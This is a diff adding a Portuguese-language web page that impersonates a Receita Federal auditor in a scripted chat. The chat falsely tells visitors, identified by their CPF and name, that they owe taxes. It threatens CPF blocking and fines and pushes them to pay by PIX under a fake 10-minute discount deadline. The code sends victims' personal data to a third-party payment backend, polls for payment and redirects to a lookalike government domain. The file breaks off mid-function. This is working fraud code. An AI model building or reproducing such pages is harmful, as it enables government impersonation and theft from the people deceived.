@@ -1,0 +1,1157 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chat - Situação Fiscal</title>
+    <link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <script src="../../cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
+<style>
+        @import url('https://fonts.cdnfonts.com/css/rawline');
+        body {
+            font-family: 'Rawline', sans-serif;
+        }
+    </style>
+<style>
+    :root {
+        --receita-blue: #044785;
+        --receita-success: #28a745;
+        --receita-danger: #dc3545;
+    }
+
+    @keyframes slideDown {
+        0% { 
+            transform: translateY(-100%);
+            opacity: 0;
+        }
+        100% { 
+            transform: translateY(0);
+            opacity: 1;
+        }
+    }
+    
+    @keyframes fadeIn {
+        0% { opacity: 0; }
+        100% { opacity: 1; }
+    }
+
+    body {
+        background-color: #fff;
+        color: #333;
+        line-height: 1.6;
+    }
+
+    .chat-container {
+        overflow-y: auto;
+        padding: 10px 20px;
+        scroll-behavior: smooth;
+        display: flex;
+        flex-direction: column;
+    }
+
+    .chat-container::-webkit-scrollbar {
+        width: 6px;
+    }
+
+    .chat-container::-webkit-scrollbar-track {
+        background: #f1f1f1;
+    }
+
+    .chat-container::-webkit-scrollbar-thumb {
+        background: #c9c9c9;
+        border-radius: 10px;
+    }
+
+    .message-bubble {
+        margin-bottom: 16px;
+        max-width: 75%;
+        position: relative;
+        display: flex;
+        flex-direction: column;
+    }
+
+    .incoming-message {
+        align-self: flex-start;
+        margin-right: auto;
+        padding-left: 0px;
+        margin-left: -10px;
+    }
+
+    .outgoing-message {
+        align-self: flex-end;
+        margin-left: auto;
+        align-items: flex-end;
+        padding-right: 0px;
+        margin-right: -10px;
+    }
+
+    .message-content {
+        padding: 14px 18px;
+        border-radius: 18px;
+        box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        margin-top: 4px;
+        position: relative;
+        line-height: 1.5;
+    }
+
+    .incoming-message .message-content {
+        background-color: #044785;
+        border-top-left-radius: 2px;
+        text-align: left;
+        color: white;
+        min-width: 200px;
+    }
+
+    .outgoing-message .message-content {
+        background-color: #d4d4d4;
+        border-top-right-radius: 2px;
+        text-align: right;
+        border-right: 2px solid #999;
+    }
+
+    .chat-avatar {
+        width: 46px;
+        height: 46px;
+        border-radius: 50%;
+        object-fit: cover;
+        border: 2px solid var(--receita-blue);
+        box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+    }
+
+    .status-indicator {
+        position: absolute;
+        bottom: 0;
+        right: 0;
+        width: 14px;
+        height: 14px;
+        border-radius: 50%;
+        background-color: var(--receita-success);
+        border: 2px solid white;
+    }
+
+    .chat-options {
+        margin-top: 10px;
+        margin-bottom: 20px;
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        padding-left: 0px;
+        margin-left: -10px;
+        max-width: 75%;
+    }
+
+    .option-button {
+        background: linear-gradient(145deg, #e6e6e6, #f8f8f8);
+        border: 1px solid #d0d0d0;
+        border-radius: 2px;
+        padding: 16px 20px;
+        text-align: left;
+        transition: all 0.2s ease;
+        cursor: pointer;
+        font-weight: 500;
+        box-shadow: 
+            0 4px 8px rgba(0,0,0,0.1),
+            inset 0 1px 0 rgba(255,255,255,0.5),
+            inset 0 -1px 0 rgba(0,0,0,0.1);
+        font-size: 1.05rem;
+        margin-bottom: 12px;
+        color: #333;
+    }
+
+    .option-button:hover {
+        background: linear-gradient(145deg, #f0f0f0, #ffffff);
+        border-color: var(--receita-blue);
+        transform: translateY(-2px);
+        box-shadow: 
+            0 6px 16px rgba(0,0,0,0.15),
+            inset 0 1px 0 rgba(255,255,255,0.7),
+            inset 0 -1px 0 rgba(0,0,0,0.05);
+    }
+
+    .option-button i {
+        font-size: 1.2rem;
+        margin-right: 10px;
+        vertical-align: middle;
+    }
+
+    .avatar-container {
+        position: relative;
+        margin-right: 15px;
+        flex-shrink: 0;
+    }
+
+    .typing-animation {
+        display: flex;
+        align-items: center;
+        column-gap: 5px;
+        height: 15px;
+    }
+
+    .typing-animation .dot {
+        display: block;
+        width: 7px;
+        height: 7px;
+        opacity: 0.8;
+        border-radius: 50%;
+        background-color: white;
+        animation: loadingFade 1s infinite;
+    }
+
+    .typing-animation .dot:nth-child(1) {
+        animation-delay: 0s;
+    }
+
+    .typing-animation .dot:nth-child(2) {
+        animation-delay: 0.2s;
+    }
+
+    .typing-animation .dot:nth-child(3) {
+        animation-delay: 0.4s;
+    }
+
+    @keyframes loadingFade {
+        0% {
+            opacity: 0.3;
+            transform: scale(0.8);
+        }
+        50% {
+            opacity: 1;
+            transform: scale(1.2);
+        }
+        100% {
+            opacity: 0.3;
+            transform: scale(0.8);
+        }
+    }
+
+    @media (max-width: 576px) {
+        .message-bubble {
+            max-width: 85%;
+        }
+
+        .chat-container {
+            height: 55vh;
+            padding: 15px;
+        }
+    }
+</style>
+
+<body class="bg-gray-50">
+<header class="bg-gray-100 flex items-center justify-between p-1 border-b-[0.3em] border-orange-300">
+        <img src="../assets/images/logo.png" alt="Logo" class="w-30 h-20 p-1">
+        <div class="p-4 flex gap-2 items-center">
+            <span class="hidden text-sm text-gray-700 md:inline">Chat de regularização</span>
+            <i class="lni lnis-user-4 text-lg text-[1.2em]"></i>
+        </div>
+    </header>
+    <div class="bg-gray-100 text-gray-800 px-4 md:px-8 py-3 border-b border-orange-200">
+        <div class="max-w-5xl mx-auto flex items-center w-full">
+            <div class="avatar-container mr-4">
+                <img src="../i.postimg.cc/dt5sbTTf/20250730-1844-Auditora-em-Escrito-rio-remix-01k1emk074ffjsxdk3xfe9b385.png" 
+                     class="chat-avatar" alt="Tereza Alencar">
+                <span class="status-indicator"></span>
+            </div>
+            <div class="flex-1">
+                <h2 class="text-gray-800 text-base font-semibold">Tereza Alencar</h2>
+                <p class="text-gray-600 text-xs">Auditora da Receita Federal • atendimento automatizado</p>
+            </div>
+        </div>
+    </div>
+
+    <main class="container mx-auto px-4 py-2">
+        <div class="max-w-6xl mx-auto">
+            <div class="overflow-hidden position-relative">
+                <div class="chat-container" id="chatContainer" style="height: calc(100vh - 200px); min-height: 400px;">
+                </div>
+            </div>
+        </div>
+    </main>
+
+<script>
+function handlePaymentClick() {
+    openPixModal(null);
+}
+
+const urlParams = new URLSearchParams(window.location.search);
+const cpfParam = urlParams.get('cpf');
+const nomeParam = urlParams.get('nome');
+let customerData = {};
+try {
+    customerData = JSON.parse(localStorage.getItem('customerData') || '{}');
+} catch (e) {
+    customerData = {};
+}
+if (cpfParam) {
+    customerData.cpf = cpfParam;
+}
+if (nomeParam) {
+    customerData.nome = nomeParam;
+}
+try {
+    localStorage.setItem('customerData', JSON.stringify(customerData));
+} catch (e) {}
+
+function capitalizeNames(name) {
+    if (!name) return 'Nome não informado';
+    return name.toLowerCase().split(' ').map(word => 
+        word.charAt(0).toUpperCase() + word.slice(1)
+    ).join(' ');
+}
+
+const firstName = customerData.nome ? capitalizeNames(customerData.nome.split(' ')[0]) : 'Contribuinte';
+const fullName = customerData.nome ? capitalizeNames(customerData.nome) : 'Nome não informado';
+const cpf = customerData.cpf || 'CPF não informado';
+
+// Informações sobre parcelas selecionadas
+const parcelasSelecionadas = customerData.parcelasSelecionadas || [];
+const quantidadeParcelas = customerData.quantidadeParcelas || 0;
+const valorTotal = customerData.valorTotal || 'R$ 146,38';
+
+// Backend de pagamentos (Netlify) - mesmo esquema do projeto aquigas
+const PAYMENT_API_BASE = 'https://deluxe-lily-5a4e4f.netlify.app/api/vizzionpay';
+function parseValorTotal(v) {
+    const n = parseFloat(String(v).replace(/[^\d,.-]/g, '').replace('.', '').replace(',', '.'));
+    return Number.isFinite(n) && n > 0 ? n : 146.38;
+}
+
+// Mensagem dinâmica sobre as parcelas
+let mensagemParcelas = '';
+if (parcelasSelecionadas && parcelasSelecionadas.length > 0) {
+    const anosFormatados = parcelasSelecionadas.join(', ');
+    mensagemParcelas = ` Você selecionou ${quantidadeParcelas} parcela${quantidadeParcelas > 1 ? 's' : ''} (ano${quantidadeParcelas > 1 ? 's' : ''}: ${anosFormatados}) no valor total de ${valorTotal}.`;
+} else {
+    mensagemParcelas = ` O débito total a ser pago é de ${valorTotal}.`;
+}
+
+const chatSequence = [
+    {
+        message: `Olá ${firstName}, aqui é a Tereza Alencar, Auditora da Receita Federal do Brasil.`,
+        delay: 1200
+    },
+    {
+        message: `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente no seu CPF ${cpf}, registrado em nome de ${fullName}.${mensagemParcelas}`,
+        delay: 2200,
+        requestPhone: true
+    },
+    {
+        message: `Prezado ${firstName}, informo que seu CPF já consta na lista para bloqueio automático. Caso não efetue o pagamento, todas as atividades financeiras serão restringidas, incluindo operações bancárias, cartões de crédito e atividades comerciais.`,
+        delay: 2000
+    },
+    {
+        message: `Além disso, se o pagamento não for realizado hoje será aplicada uma multa adicional no valor de R$ 1.985,00 ao seu CPF, conforme determina a legislação tributária federal.`,
+        delay: 1900
+    },
+    {
+        message: `Importante: realizando o pagamento hoje (${new Date().toLocaleDateString("pt-BR")}) há um desconto de 67%, reduzindo o débito para apenas ${valorTotal}. ${firstName}, deseja quitar com desconto ou autoriza o bloqueio do CPF?`,
+        delay: 1800,
+        showOptions: 'debtOptions'
+    }
+];
+
+const chatContainer = document.getElementById('chatContainer');
+
+function addMessage(text, isIncoming = true, scrollToBottom = true) {
+    const messageDiv = document.createElement('div');
+    messageDiv.className = `message-bubble ${isIncoming ? 'incoming-message' : 'outgoing-message'}`;
+    
+    messageDiv.innerHTML = `
+        <div class="message-content">
+            ${text.replace(/\n/g, '<br>')}
+        </div>
+    `;
+    
+    chatContainer.appendChild(messageDiv);
+    
+    if (scrollToBottom) {
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+    }
+}
+
+function showTyping(duration = 3000) {
+    return new Promise(resolve => {
+        const typingDiv = document.createElement('div');
+        typingDiv.className = 'message-bubble incoming-message typing-indicator-bubble';
+        typingDiv.style.paddingLeft = '0px';
+        typingDiv.style.marginLeft = '-10px';
+        typingDiv.innerHTML = `
+            <div class="message-content d-flex align-items-center" style="background-color: #044785; color: white; min-width: 70px; max-width: 70px; border-radius: 18px; padding: 10px 15px;">
+                <div class="typing-animation">
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                    <span class="dot"></span>
+                </div>
+            </div>
+        `;
+
+        chatContainer.appendChild(typingDiv);
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+
+        setTimeout(() => {
+            if (typingDiv.parentNode) {
+                typingDiv.parentNode.removeChild(typingDiv);
+            }
+            resolve();
+        }, duration);
+    });
+}
+
+function showOptions(optionsId) {
+    let optionsHtml = '';
+
+    if (optionsId === 'debtOptions') {
+        optionsHtml = `
+            <div class="chat-options">
+                <button class="option-button mb-2 d-block w-100 text-start" onclick="handleOptionClick(this, 'Vou quitar o débito agora mesmo', 'redirectToPayment')">
+                    <span style="display:inline-flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:50%;background:#28a745;margin-right:10px;flex-shrink:0;">
+                        <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><path d="M2 6.5L5.2 10L11 3" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                    </span>
+                    Vou quitar o débito agora mesmo
+                </button>
+                <button class="option-button d-block w-100 text-start" onclick="handleOptionClick(this, 'Autorizo o bloqueio do meu CPF', 'confirmBlock')">
+                    <span style="display:inline-flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:50%;background:#dc3545;margin-right:10px;flex-shrink:0;">
+                        <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M2 2L9 9M9 2L2 9" stroke="white" stroke-width="2" stroke-linecap="round"/></svg>
+                    </span>
+                    Autorizo o bloqueio do meu CPF
+                </button>
+            </div>
+        `;
+    }
+
+    if (optionsHtml) {
+        chatContainer.insertAdjacentHTML('beforeend', optionsHtml);
+        chatContainer.scrollTop = chatContainer.scrollHeight;
+    }
+}
+
+function handleOptionClick(button, responseText, nextAction) {
+    
+    addMessage(responseText, false, true);
+
+    const optionsContainer = button.closest('.chat-options');
+    if (optionsContainer) {
+        optionsContainer.remove();
+    }
+
+    setTimeout(async () => {
+        if (nextAction === 'redirectToPayment') {
+            await showTyping(1200);
+            addMessage(`${firstName}, este é o último aviso para regularizar esse débito. Não haverá nova oportunidade após hoje.`, true, true);
+            
+            await showTyping(1500);
+            addMessage('Segundo as normas da Receita Federal, o pagamento com desconto tem validade de 10 minutos. Se você gerar o código PIX e não realizar o pagamento, a negociação será cancelada e será aplicada uma multa de não cumprimento do acordo no valor de R$985,00 e o CPF seguirá na lista de bloqueio.', true, true);
+            
+            setTimeout(() => {
+                showPaymentButton();
+            }, 600);
+        } else if (nextAction === 'confirmBlock') {
+            await showTyping(2000);
+            addMessage('Entendido. Vou iniciar o processo de bloqueio do seu CPF conforme os procedimentos da Receita Federal. O bloqueio será efetivado em breve. Obrigada pela atenção.', true, true);
+        }
+    }, 400);
+}
+
+function showPaymentButton() {
+    const buttonHtml = `
+        <div class="payment-button-container" style="margin-top: 20px; margin-bottom: 20px; padding-left: 0px; margin-left: -10px; max-width: 75%;">
+            <button class="payment-button" onclick="handlePaymentClick()" style="
+                background: #28a745;
+                border: none;
+                border-radius: 2px;
+                padding: 16px 24px;
+                color: white;
+                font-weight: 600;
+                font-size: 1.1rem;
+                cursor: pointer;
+                width: 100%;
+                text-align: center;
+                transition: all 0.3s ease;
+                box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
+            " onmouseover="this.style.background='#218838'; this.style.transform='translateY(-2px)'" 
+               onmouseout="this.style.background='#28a745'; this.style.transform='translateY(0)'">
+                <i class="fas fa-credit-card" style="margin-right: 10px;"></i>
+                Realizar pagamento
+            </button>
+        </div>
+    `;
+    
+    chatContainer.insertAdjacentHTML('beforeend', buttonHtml);
+    chatContainer.scrollTop = chatContainer.scrollHeight;
+}
+
+async function openPixModal(recaptchaToken) {
+    try {
+        // Exibe modal de carregamento
+        const loadingModal = document.createElement('div');
+        loadingModal.id = 'pixLoadingModal';
+        loadingModal.innerHTML = `
+            <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.5); z-index: 3000; display: flex; align-items: center; justify-content: center;">
+                <div style="background: #fff; padding: 40px 30px; border-radius: 10px; box-shadow: 0 8px 32px rgba(0,0,0,0.18); text-align: center; min-width: 260px;">
+                    <div class='spinner' style='margin: 0 auto 18px auto; width: 48px; height: 48px; border: 6px solid #f3f3f3; border-top: 6px solid #044785; border-radius: 50%; animation: spin 1s linear infinite;'></div>
+                    <div style='font-size: 1.15rem; color: #044785; font-weight: 600;'>Gerando seu pagamento PIX...</div>
+                </div>
+            </div>
+            <style>@keyframes spin {0% { transform: rotate(0deg);}100% { transform: rotate(360deg);}}</style>
+        `;
+        document.body.appendChild(loadingModal);
+
+        const paymentResponse = await fetch(`${PAYMENT_API_BASE}/pix`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                amount: parseValorTotal(valorTotal),
+                name: customerData.nome || '',
+                email: customerData.email || '',
+                phone: sanitizePhoneDigits(customerData.telefone || ''),
+                document: String(customerData.cpf || '').replace(/\D/g, '')
+            })
+        });
+        document.getElementById('pixLoadingModal')?.remove();
+
+        if (!paymentResponse.ok) {
+            addMessage('Erro ao gerar cobrança PIX. Tente novamente mais tarde.', true, true);
+            return;
+        }
+
+        const paymentJson = await paymentResponse.json();
+        const pixCode = paymentJson.pix?.code || paymentJson.code || '';
+        const paymentData = { id: paymentJson.transactionId || paymentJson.identifier || '' };
+
+        if (pixCode) {
+            showPixModal({
+                pixCode: pixCode,
+                pixQrCode: pixCode,
+                transaction_id: paymentData.id || '',
+                valorTotal: valorTotal
+            });
+        } else {
+            addMessage('Erro ao gerar cobrança PIX. Tente novamente mais tarde.', true, true);
+        }
+    } catch (error) {
+        document.getElementById('pixLoadingModal')?.remove();
+        console.error('Erro ao processar pagamento:', error);
+        addMessage('Erro ao processar pagamento. Tente novamente mais tarde.', true, true);
+    }
+}
+
+function showLoadingModal() {
+    const modalHtml = `
+        <div id="pixModal" class="modal" style="display: block; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: rgba(0, 0, 0, 0.5); z-index: 2000; overflow-y: auto;">
+            <div class="modal-content" style="background-color: white; width: 100vw; min-height: 100vh; margin: 0; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; justify-content: center; align-items: center;">
+                <div style="text-align: center;">
+                    <div class="spinner" style="
+                        width: 60px;
+                        height: 60px;
+                        border: 6px solid #f3f3f3;
+                        border-top: 6px solid #044785;
+                        border-radius: 50%;
+                        animation: spin 1s linear infinite;
+                        margin: 0 auto 30px auto;
+                    "></div>
+                    <h2 style="color: #044785; font-weight: 600; margin-bottom: 15px; font-size: 1.3rem;">Aguardando pagamento...</h2>
+                    <p style="color: #666; font-size: 1rem;">Gerando DARF, por favor aguarde...</p>
+                </div>
+            </div>
+        </div>
+        <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        </style>
+    `;
+    
+    document.body.insertAdjacentHTML('beforeend', modalHtml);
+}
+
+async function generateQRCodeFromPix(pixCode) {
+    try {
+        if (typeof QRious === 'undefined') {
+            console.error('QRious library not loaded');
+            return null;
+        }
+        
+        const canvas = document.createElement('canvas');
+        
+        const qr = new QRious({
+            element: canvas,
+            value: pixCode,
+            size: 200,
+            background: '#ffffff',
+            foreground: '#000000'
+        });
+        
+        const qrCodeDataURL = canvas.toDataURL('image/png');
+        return qrCodeDataURL;
+    } catch (error) {
+        console.error('Erro ao gerar QR Code:', error);
+        return null;
+    }
+}
+
+function showPixModal(data) {
+    const existingModal = document.getElementById('pixModal');
+    if (existingModal) {
+        existingModal.remove();
+    }
+
+    const pixCode = data.pixCode || data.pix_code;
+    const valorTotal = data.valorTotal || 'R$ 146,38';
+
+    if (!pixCode) {
+        console.error('❌ Código PIX não encontrado na resposta da API');
+        alert('Erro: Código PIX não recebido da API');
+        return;
+    }
+
+    console.log('🔍 Código PIX recebido:', pixCode);
+
+    const transactionId = data.transaction_id || data.orderId || data.order_id;
+    console.log('🔍 Dados PIX recebidos:', data);
+    console.log('🆔 Transaction ID identificado:', transactionId);
+    if (transactionId) {
+        console.log('✅ Iniciando monitoramento de pagamento para:', transactionId);
+        startPaymentMonitoring(transactionId);
+    } else {
+        console.error('❌ Nenhum transaction_id encontrado nos dados:', data);
+    }
+
+    const modalHtml = `
+        <div id="pixModal" class="modal" style="display: flex; position: fixed; inset: 0; width: 100vw; height: 100vh; background-color: rgba(15, 23, 42, 0.75); z-index: 2000; align-items: center; justify-content: center; padding: 16px; box-sizing: border-box; animation: fadeIn 0.4s ease-out;">
+            <div class="modal-content" style="background: #ffffff; width: 100%; max-width: 420px; max-height: 90vh; border-radius: 18px; box-shadow: 0 20px 45px rgba(15, 23, 42, 0.45); padding: 22px 20px 20px 20px; overflow-y: auto; box-sizing: border-box; animation: slideDown 0.4s ease-out;">
+                <div style="text-align: center; margin-bottom: 20px;">
+                    <div id="pixQrSpinner" class="spinner" style="
+                        width: 40px;
+                        height: 40px;
+                        border: 4px solid #f3f3f3;
+                        border-top: 4px solid #044785;
+                        border-radius: 50%;
+                        animation: spin 1s linear infinite;
+                        margin: 0 auto 15px auto;
+                    "></div>
+                    <h2 style="color: #044785; font-weight: 600; margin-bottom: 6px; font-size: 1.25rem;">Aguardando pagamento PIX</h2>
+                    <p style="color: #64748b; font-size: 0.9rem;">Escaneie o QR Code ou use o código copia e cola</p>
+                </div>
+
+                <div id="pixDeadlineBox" style="background: #fff7ed; border: 1px solid #fdba74; border-radius: 12px; padding: 10px 12px; margin-bottom: 14px;">
+                    <div style="display: flex; align-items: center; justify-content: space-between; gap: 8px;">
+                        <span style="color: #9a3412; font-weight: 700; font-size: 0.84rem; letter-spacing: 0.2px;">Tempo para pagamento com desconto</span>
+                        <span id="pixCountdown" style="font-size: 1rem; font-weight: 800; color: #b45309;">10:00</span>
+                    </div>
+                    <div style="margin-top: 8px; width: 100%; height: 7px; border-radius: 999px; background: #fed7aa;">
+                        <div id="pixCountdownBar" style="height: 100%; width: 100%; border-radius: 999px; background: linear-gradient(90deg,#f59e0b,#fb923c); transition: width 1s linear;"></div>
+                    </div>
+                </div>
+
+                <div style="text-align: center; margin: 16px 0 18px 0;">
+                    <div style="display: inline-block; padding: 10px; background: white; border-radius: 16px; box-shadow: 0 8px 24px rgba(15,23,42,0.12);">
+                        <img id="pixQrImage" src="" alt="QR Code PIX" style="width: 180px; height: 180px; display: none;">
+                        <div id="pixQrPlaceholder" style="width: 180px; height: 180px; display: flex; align-items: center; justify-content: center; color: #94a3b8; font-size: 0.85rem;">Gerando QR Code...</div>
+                    </div>
+                </div>
+
+                <div style="background: #f8fafc; padding: 14px; border-radius: 12px; margin-bottom: 16px; border: 1px solid #e2e8f0;">
+                    <label style="display: block; margin-bottom: 8px; font-weight: 600; color: #0f172a; font-size: 0.9rem;">Código PIX (copia e cola) - Valor: ${valorTotal}</label>
+                    <div style="margin-bottom: 10px;">
+                        <textarea id="pixCodeInputDisplay" readonly style="width: 100%; height: 110px; padding: 12px; border: 1px solid #cbd5f1; border-radius: 8px; font-family: monospace; font-size: 0.82rem; resize: none; line-height: 1.35; word-wrap: break-word; color: #0f172a; background: #ffffff;">${pixCode}</textarea>
+                        <input type="hidden" id="pixCodeInputReal" value="${pixCode}">
+                    </div>
+                    <button onclick="copyPixCode()" style="width: 100%; padding: 11px 16px; background: linear-gradient(135deg,#16a34a,#22c55e); color: white; border: none; border-radius: 999px; cursor: pointer; font-weight: 600; font-size: 0.92rem; display: inline-flex; align-items: center; justify-content: center; gap: 8px;">
+                        <i class="fas fa-copy"></i><span>Copiar código PIX completo</span>
+                    </button>
+                </div>
+
+                <div style="background: #f1f5f9; padding: 12px 12px 10px 12px; border-radius: 10px; margin-top: 8px;">
+                    <div style="display: flex; align-items: flex-start; gap: 10px;">
+                        <div style="width: 26px; height: 26px; border-radius: 999px; background: #e0f2fe; display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
+                            <i class="fas fa-info" style="color: #0369a1; font-size: 0.8rem;"></i>
+                        </div>
+                        <div style="color: #475569; font-size: 0.85rem; line-height: 1.4; text-align: left;">
+                            <p style="margin-bottom: 4px;"><strong>1.</strong> Copie o código PIX no botão acima ou aponte a câmera do seu banco para o QR Code.</p>
+                            <p style="margin-bottom: 4px;"><strong>2.</strong> Confirme o pagamento de <strong>${valorTotal}</strong> no app do seu banco.</p>
+                            <p style="margin: 0;"><strong>3.</strong> Após o pagamento, aguarde a confirmação automática nesta tela.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <button id="pixRegenerateButton" onclick="regeneratePixCode()" style="display: none; width: 100%; margin-top: 12px; padding: 11px 16px; background: linear-gradient(135deg,#044785,#1d4ed8); color: white; border: none; border-radius: 999px; cursor: pointer; font-weight: 700; font-size: 0.92rem;">
+                    Gerar novo código PIX
+                </button>
+
+            </div>
+        </div>
+        <style>
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        </style>
+    `;
+
+    document.body.insertAdjacentHTML('beforeend', modalHtml);
+    startPixCountdown(10 * 60);
+
+    generateQRCodeFromPix(pixCode).then(qrCodeDataURL => {
+        if (!qrCodeDataURL) {
+            console.error('❌ Erro ao gerar QR Code');
+            const placeholder = document.getElementById('pixQrPlaceholder');
+            if (placeholder) placeholder.textContent = 'Erro ao gerar QR Code';
+            return;
+        }
+        console.log('✅ QR Code gerado com sucesso');
+        const img = document.getElementById('pixQrImage');
+        const placeholder = document.getElementById('pixQrPlaceholder');
+        const spinner = document.getElementById('pixQrSpinner');
+        if (img) {
+            img.src = qrCodeDataURL;
+            img.style.display = 'block';
+        }
+        if (placeholder) placeholder.style.display = 'none';
+        if (spinner) spinner.style.display = 'none';
+    }).catch(error => {
+        console.error('❌ Erro ao gerar QR Code:', error);
+        const placeholder = document.getElementById('pixQrPlaceholder');
+        if (placeholder) placeholder.textContent = 'Erro ao gerar QR Code';
+        const spinner = document.getElementById('pixQrSpinner');
+        if (spinner) spinner.style.display = 'none';
+    });
+}
+
+function formatCountdown(secondsLeft) {
+    const total = Math.max(0, Math.floor(secondsLeft));
+    const minutes = String(Math.floor(total / 60)).padStart(2, '0');
+    const seconds = String(total % 60).padStart(2, '0');
+    return `${minutes}:${seconds}`;
+}
+
+function stopPixCountdown() {
+    if (window.pixCountdownInterval) {
+        clearInterval(window.pixCountdownInterval);
+        window.pixCountdownInterval = null;
+    }
+}
+
+function startPixCountdown(durationSeconds) {
+    stopPixCountdown();
+
+    const timerEl = document.getElementById('pixCountdown');
+    const barEl = document.getElementById('pixCountdownBar');
+    const boxEl = document.getElementById('pixDeadlineBox');
+    const regenerateBtn = document.getElementById('pixRegenerateButton');
+    const copyBtn = document.querySelector('#pixModal button[onclick="copyPixCode()"]');
+
+    if (!timerEl || !barEl || !boxEl) {
+        return;
+    }
+
+    const total = Math.max(1, parseInt(durationSeconds, 10) || 600);
+    const startedAt = Date.now();
+
+    const render = () => {
+        const elapsed = Math.floor((Date.now() - startedAt) / 1000);
+        const remaining = Math.max(0, total - elapsed);
+        const ratio = remaining / total;
+
+        timerEl.textContent = formatCountdown(remaining);
+        barEl.style.width = `${Math.max(0, ratio * 100)}%`;
+
+        if (remaining <= 120) {
+            boxEl.style.background = '#fef2f2';
+            boxEl.style.borderColor = '#fca5a5';
+            timerEl.style.color = '#dc2626';
+            barEl.style.background = 'linear-gradient(90deg,#ef4444,#f97316)';
+        }
+
+        if (remaining <= 0) {
+            stopPixCountdown();
+            boxEl.style.background = '#fef2f2';
+            boxEl.style.borderColor = '#fca5a5';
+            timerEl.textContent = 'EXPIRADO';
+            timerEl.style.color = '#b91c1c';
+            barEl.style.width = '0%';
+            barEl.style.background = '#ef4444';
+            if (copyBtn) {
+                copyBtn.disabled = true;
+                copyBtn.style.opacity = '0.7';
+                copyBtn.style.cursor = 'not-allowed';
+            }
+            if (regenerateBtn) {
+                regenerateBtn.style.display = 'block';
+            }
+        }
+    };
+
+    render();
+    window.pixCountdownInterval = setInterval(render, 1000);
+}
+
+function regeneratePixCode() {
+    closePixModal();
+    handlePaymentClick();
+}
+
+function copyPixCode() {
+    const realPixInput = document.getElementById('pixCodeInputReal');
+    const realPixCode = realPixInput.value;
+    
+    try {
+        if (navigator.clipboard && window.isSecureContext) {
+            navigator.clipboard.writeText(realPixCode);
+        } else {
+            const textArea = document.createElement('textarea');
+            textArea.value = realPixCode;
+            document.body.appendChild(textArea);
+            textArea.select();
+            textArea.setSelectionRange(0, 99999);
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+        }
+        
+        const button = event.target.closest('button');
+        const originalText = button.innerHTML;
+        button.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+        button.style.background = '#28a745';
+        
+        setTimeout(() => {
+            button.innerHTML = originalText;
+            button.style.background = '#044785';
+        }, 3000);
+    } catch (err) {
+        console.error('Erro ao copiar:', err);
+        alert('Erro ao copiar código. Tente selecionar manualmente.');
+    }
+}
+
+function closePixModal() {
+    const modal = document.getElementById('pixModal');
+    if (modal) {
+        modal.remove();
+    }
+    
+    if (window.paymentMonitorInterval) {
+        clearInterval(window.paymentMonitorInterval);
+        window.paymentMonitorInterval = null;
+    }
+    stopPixCountdown();
+}
+
+function startPaymentMonitoring(transactionId) {
+    if (window.paymentMonitorInterval) {
+        clearInterval(window.paymentMonitorInterval);
+    }
+    window.paymentMonitorInterval = setInterval(async () => {
+        if (document.hidden) {
+            return;
+        }
+        try {
+            const statusUrl = `${PAYMENT_API_BASE}/status?identifier=${encodeURIComponent(transactionId)}`;
+            const response = await fetch(statusUrl);
+
+            if (!response.ok) {
+                console.error(`❌ Erro HTTP ${response.status}: ${response.statusText}`);
+                return;
+            }
+
+            const statusData = await response.json();
+            console.log('📊 Status recebido:', statusData);
+
+            let status = null;
+            if (statusData && statusData.status) {
+                status = statusData.status;
+            }
+            const statusNormalizado = status ? String(status).toLowerCase() : '';
+
+            console.log(`🎯 Status atual normalizado: "${statusNormalizado}"`);
+
+            if (statusNormalizado === 'approved' || statusNormalizado === 'paid') {
+                clearInterval(window.paymentMonitorInterval);
+                window.paymentMonitorInterval = null;
+                closePixModal();
+
+                let cpfParam = '';
+                try {
+                    const stored = localStorage.getItem('customerData');
+                    if (stored) {
+                        const parsed = JSON.parse(stored);
+                        if (parsed && parsed.cpf) {
+                            cpfParam = String(parsed.cpf).replace(/\D/g, '');
+                        }
+                    }
+                } catch (e) {
+                    console.warn('Não foi possível ler customerData do localStorage para o CPF:', e);
+                }
+                if (cpfParam) {
+                    window.location.href = `../indexe5bf.html?cpf=${encodeURIComponent(cpfParam)}&sem_pendencias=1&pagamento_sucesso=1`;
+                } else {
+                    window.location.href = 'https://seguir.fazendagovbr.co/indexe5bf.html?sem_pendencias=1&amp;pagamento_sucesso=1';
+                }
+            } else if (statusNormalizado === 'processing') {
+                console.log('⏳ Pagamento em processamento...');
+            } else {
+                console.log(`⏳ Pagamento ainda pendente - Status: ${status}`);
+            }
+        } catch (error) {
+            console.error('❌ Erro ao verificar status do pagamento via pix/detalhes.php:', error);
+        }
+    }, 5000);
+    
+    console.log(`⏰ Monitoramento configurado com timeout de 20 minutos`);
+    
+    setTimeout(() => {
+        if (window.paymentMonitorInterval) {
+            clearInterval(window.paymentMonitorInterval);
